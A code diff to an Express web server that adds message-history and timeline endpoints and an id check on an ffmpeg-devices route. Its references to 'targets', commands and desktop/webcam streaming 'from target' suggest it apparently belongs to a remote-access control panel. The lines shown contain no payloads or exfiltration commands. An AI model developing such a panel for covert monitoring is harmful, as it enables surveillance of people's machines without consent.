@@ -39,15 +39,32 @@ app.get("/communication", function(req, res){
 		}
 		else
 		{	
-			target_info = webSrv.utils.enhance_var(target_info);
-			res.render(path.join(__dirname,"views","communication"),
+			core.db_ops.get_recent_msgs(req.query.id, function(err, msgs){
+				if(err)
 				{
-					info: target_info,
-					targets: targets,
-					missed_notifs: missed_notifs,
-					nb_msg_notifs: webSrv.utils.nb_msg_notifs(missed_notifs),
-					nb_notifs: webSrv.utils.nb_notifs(missed_notifs)
-				});
+					res.render(path.join(__dirname,"views","500"),
+					{
+						err: err,
+						targets: targets,
+						missed_notifs: missed_notifs
+					});
+				}
+				else
+				{
+					target_info = webSrv.utils.enhance_var(target_info);
+					res.render(path.join(__dirname,"views","communication"),
+					{
+						msgs: msgs,
+						info: target_info,
+						targets: targets,
+						missed_notifs: missed_notifs,
+						nb_msg_notifs: webSrv.utils.nb_msg_notifs(missed_notifs),
+						nb_notifs: webSrv.utils.nb_notifs(missed_notifs)
+					});
+				}
+			});
+
+			
 		}
 		missed_notifs = [];
 	});
@@ -67,26 +84,61 @@ app.get("/get_cmds", function(req, res){
 // get ffmpeg devices
 app.get("/get_ffmpeg_devs", function(req, res){
 
-	core.db_ops.get_ffmpeg_devs(req.query.id, function(err, devs){
-		if(err)
-		{
-			util.log(("[get_ffmpeg_devs] Error : "+ err.message).red);
-		}
-		else if(devs)
-		{
-			res.send(JSON.parse('{"video_devs": '+devs.video_devs+'}'));	
-		}
-		else
-		{
-			util.log("No ffmpeg_devs found for : " + req.query.id );
-		}
-	});
+	if(req.query.id)
+	{
+		core.db_ops.get_ffmpeg_devs(req.query.id, function(err, devs){
+			if(err)
+			{
+				util.log(("[get_ffmpeg_devs] Error : "+ err.message).red);
+			}
+			else if(devs)
+			{
+				res.send(JSON.parse('{"video_devs": '+devs.video_devs+'}'));	
+			}
+			else
+			{
+				util.log("No ffmpeg_devs found for : " + req.query.id );
+			}
+		});
+	}
+	else
+	{
+		res.send(JSON.parse('{"error": "unspecified \'id\' parameter"}'));
+	}
 	
 });
 
 // handle desktop/webcam streaming (from target)
 app.ws("/stream", function(ws_stream, req){
 	global.ws_stream = ws_stream;
+});
+
+// get recent msg from history
+app.get("/recent_msgs", function(req, res,){
+	core.db_ops.get_recent_msgs(req.query.id, function(err, msgs){
+		if(err)
+		{
+			util.log(("[get_recent_msgs] Error : "+ err.message).red);
+		}
+		else
+		{
+			res.send(msgs);	
+		}
+	})
+});
+
+// get TimeLine
+app.get("/timeline", function(req, res){
+	core.db_ops.get_timeLine(req.query.id, function(err, rows){
+		if(err)
+		{
+			util.log(("[get_timeLine] Error : "+ err.message).red);
+		}
+		else
+		{
+			res.send(rows);	
+		}
+	});
 });
 
 // handle http errors
